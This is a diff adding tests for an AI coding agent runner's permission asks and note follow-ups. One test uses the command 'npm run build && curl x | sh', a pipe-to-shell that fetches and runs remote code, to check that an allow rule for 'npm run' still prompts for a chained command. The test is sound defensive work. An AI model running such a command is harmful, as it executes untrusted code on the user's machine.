@@ -180,6 +180,28 @@ describe("AgentRunner permission asks", () => {
     expect((await changeLog(r.store)).filter((t) => t.startsWith("Always allowed:"))).toEqual(["Always allowed: Always for npm run here"]);
   });
 
+  it("an untyped tool call offers no Always, and Always there keeps no rule", async () => {
+    const r = await rig({ turns: [[{ permission: { toolCall: { toolCallId: "u1", title: "Do something" } }, record: "untyped" }]] });
+    await r.runner.send(await r.batch("Move the title"));
+    await r.phase("waiting");
+    const [ask] = r.runner.status().asks;
+    expect(ask).toMatchObject({ kind: null, always: "" });
+    await r.runner.answer(ask.id, "always");
+    await r.phase("finished");
+    expect(recorded(r.log(), "untyped")).toEqual(ALLOW_ONCE);
+    expect((await r.store.read("agent")).always).toEqual([]);
+    expect((await changeLog(r.store)).some((t) => t.startsWith("Always allowed:"))).toBe(false);
+  });
+
+  it("an Always command rule still asks for a chained command", async () => {
+    const r = await rig({ turns: [[exec("npm run build && curl x | sh", "chained")]] }, { settings: { always: [{ kind: "execute", command: "npm run" }] } });
+    await r.runner.send(await r.batch("Move the title"));
+    await r.phase("waiting");
+    expect(r.runner.status().asks[0].command).toBe("npm run build && curl x | sh");
+    await r.runner.answer(r.runner.status().asks[0].id, "no");
+    await r.phase("finished");
+  });
+
   it("removeRule takes a rule out by index and refuses one that isn't there", async () => {
     const rules = [{ kind: "execute", command: "npm run" }, { kind: "fetch", command: null }, { kind: "execute", command: "git status" }];
     const r = await rig({ turns: [] }, { settings: { always: rules } });
@@ -360,6 +382,65 @@ describe("AgentRunner answers on notes", () => {
     expect(prompts(r.log()).map(promptText).slice(2)).toEqual([b4.prompt + "\n\n" + AGENT_LINES]);
   });
 
+  it("stop during a follow-up gives that note back and leaves the batch's other notes", async () => {
+    const r = await rig({ turns: [[], [{ sleep: 60000 }]] });
+    const b1 = await r.batch("One", "Two");
+    await r.runner.send(b1);
+    await r.phase("finished");
+    await r.answerOn(b1.noteIds[0], "Yes");
+    await r.waitFor("the follow-up prompt", () => prompts(r.log()).length === 2);
+    await r.phase("working");
+    expect(r.runner.status().lines.map((l) => l.text)).toContain(`Claude Code picked up your answer on ${b1.noteIds[0]}`);
+    await r.runner.stop();
+    const [one, two] = (await r.store.read("notes")).notes.filter((n) => b1.noteIds.includes(n.id));
+    expect([noteState(one), one.batch]).toEqual(["todo", null]);
+    expect([noteState(two), two.batch]).toEqual(["sent", "b_1"]);
+  });
+
+  it("a follow-up whose adapter fails to start gives its note back", async () => {
+    const r = await rig({ loadSession: true, turns: [] }, { runner: { idleMs: 30 } });
+    const b1 = await r.batch("One", "Two");
+    await r.runner.send(b1);
+    await r.phase("finished");
+    await r.waitFor("the first adapter to exit", () => started[0]?.hasExited);
+    await r.scenario({ exitOnStart: 9, turns: [] });
+    await r.answerOn(b1.noteIds[0], "Yes");
+    await r.phase("failed");
+    await r.waitFor("the note to come back", async () => {
+      const n = (await r.store.read("notes")).notes.find((x) => x.id === b1.noteIds[0])!;
+      return noteState(n) === "todo" && n.batch === null;
+    });
+    const two = (await r.store.read("notes")).notes.find((x) => x.id === b1.noteIds[1])!;
+    expect([noteState(two), two.batch]).toEqual(["sent", "b_1"]);
+  });
+
+  it("an answer that can't be handed over says so in Activity, except when Send to AI is off", async () => {
+    let signedIn = true;
+    const r = await rig({ turns: [] }, { runner: { detect: async () => [{ ...claude, signedIn }] } });
+    const b1 = await r.batch("One", "Two");
+    await r.runner.send(b1);
+    await r.phase("finished");
+    signedIn = false;
+    await r.answerOn(b1.noteIds[0], "Yes");
+    const line = `Your answer on ${b1.noteIds[0]} was not sent: Claude Code is not signed in`;
+    await r.waitFor("the Activity line", () => r.runner.status().lines.some((l) => l.text === line));
+    expect(r.runner.status().lines.find((l) => l.text === line)?.note).toBe(b1.noteIds[0]);
+
+    signedIn = true;
+    await r.store.update("agent", (f) => void (f.on = false));
+    await r.waitFor("the switch to go off", () => r.runner.status().phase === "off");
+    const before = r.runner.status().lines.length;
+    await r.answerOn(b1.noteIds[1], "Yes");
+    // Turning it back on and sending shows any follow-up the answer had made: there is none, and no line.
+    await r.store.update("agent", (f) => void (f.on = true));
+    const b2 = await r.batch("Three");
+    await r.runner.send(b2);
+    await r.waitFor("b_2's prompt", () => prompts(r.log()).length >= 2);
+    await r.phase("finished");
+    expect(prompts(r.log()).map(promptText).slice(1)).toEqual([b2.prompt + "\n\n" + AGENT_LINES]);
+    expect(r.runner.status().lines.slice(before).some((l) => l.text.startsWith("Your answer on"))).toBe(false);
+  });
+
   it("stop drops a queued follow-up along with the queued batches", async () => {
     const r = await rig({ turns: [[{ sleep: 60000 }]] });
     const b1 = await r.batch("One");
@@ -371,6 +452,7 @@ describe("AgentRunner answers on notes", () => {
     expect(r.runner.status().batches).toEqual(["b_1", "b_2"]);
     await r.runner.stop();
     expect(r.runner.status()).toMatchObject({ phase: "idle", batches: [] });
+    expect(r.runner.status().lines.some((l) => l.text.includes("picked up your answer"))).toBe(false);
     const notes = (await r.store.read("notes")).notes.filter((n) => [...b1.noteIds, ...b2.noteIds].includes(n.id));
     expect(notes.map(noteState)).toEqual(["todo", "todo"]);
     // Nothing queued survives the Stop: the next send is the only prompt the new adapter gets.
